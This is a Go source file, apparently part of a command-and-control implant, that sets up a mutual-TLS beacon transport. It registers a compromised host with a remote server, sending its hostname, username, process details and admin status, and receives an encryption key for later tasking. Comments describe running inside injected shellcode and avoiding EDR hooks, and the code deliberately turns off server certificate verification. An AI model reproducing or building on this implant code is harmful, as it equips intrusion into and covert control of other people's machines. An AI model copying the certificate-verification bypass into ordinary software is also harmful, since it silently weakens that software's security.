package agent

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"time"
)

type mtlsTransport struct {
	httpTransport
}

func newMTLSTransport(serverURL, certPEMb64, keyPEMb64, caPEMb64 string) (*mtlsTransport, error) {
	certPEM, err := base64.StdEncoding.DecodeString(certPEMb64)
	if err != nil {
		return nil, fmt.Errorf("decode cert: %w", err)
	}
	keyPEM, err := base64.StdEncoding.DecodeString(keyPEMb64)
	if err != nil {
		return nil, fmt.Errorf("decode key: %w", err)
	}
	caPEM, err := base64.StdEncoding.DecodeString(caPEMb64)
	if err != nil {
		return nil, fmt.Errorf("decode ca: %w", err)
	}

	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return nil, fmt.Errorf("load keypair: %w", err)
	}
	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM(caPEM)

	// Skip server cert verification — injected shellcode may run in a process
	// where TLS verification fails (EDR hooks, isolation policy). The agent
	// still presents its client cert so the server performs mutual auth.
	tlsCfg := &tls.Config{
		Certificates:       []tls.Certificate{cert},
		RootCAs:            pool,
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS13,
		CurvePreferences: []tls.CurveID{
			tls.X25519MLKEM768, // hybrid PQ: X25519 + ML-KEM-768 (NIST FIPS 203)
			tls.X25519,         // classical fallback
			tls.CurveP256,
		},
	}

	// Reuse the regular HTTP profile setup so mTLS honors URI rotation,
	// custom headers, proxy configuration and the sleep-mask URL buffer.
	base := newHTTPTransportOpts(serverURL, true)
	t := &mtlsTransport{httpTransport: httpTransport{
		serverURL:  base.serverURL,
		urlBuf:     base.urlBuf,
		beaconURIs: base.beaconURIs,
		extraHdrs:  base.extraHdrs,
	}}
	tr := &http.Transport{TLSClientConfig: tlsCfg}
	if ProxyURL != "" {
		if proxy, parseErr := url.Parse(ProxyURL); parseErr == nil {
			tr.Proxy = http.ProxyURL(proxy)
		}
	}
	t.client = &http.Client{
		Transport: tr,
		Timeout:   30 * time.Second,
	}
	return t, nil
}

// register overrides the embedded httpTransport.register to tag transport as "mtls".
func (t *mtlsTransport) register(info sysInfo) error {
	sleepSec, jitterPct := parseSleepConfig()
	// Use in-memory ID if available (reconnect within the same process),
	// otherwise fall back to the compile-time preset ID for cross-restart identity.
	resumeID := t.agentID
	if resumeID == "" {
		resumeID = AgentPresetID
	}
	body, err := json.Marshal(registerRequest{
		Hostname:    info.Hostname,
		Username:    info.Username,
		OS:          info.OS,
		PID:         info.PID,
		Transport:   "mtls",
		SleepSec:    sleepSec,
		JitterPct:   jitterPct,
		ProcessName: info.ProcessName,
		IsAdmin:     info.IsAdmin,
		ParentID:    ParentAgentID,
		Language:    "go",
		ResumeID:    resumeID,
	})
	if err != nil {
		return err
	}

	req, err := http.NewRequest(http.MethodPost, t.serverURL+"/register", bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	t.applyHeaders(req)

	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("register: status %d", resp.StatusCode)
	}

	var reg registerResponse
	if err := json.NewDecoder(resp.Body).Decode(&reg); err != nil {
		return err
	}
	t.agentID = reg.AgentID
	t.aesKey, err = base64.StdEncoding.DecodeString(reg.AESKey)
	if err == nil && len(t.aesKey) > 0 {
		RegisterScramblerTarget(t.aesKey)
	}
	return err
}

func (t *mtlsTransport) agentIDStr() string { return t.agentID }
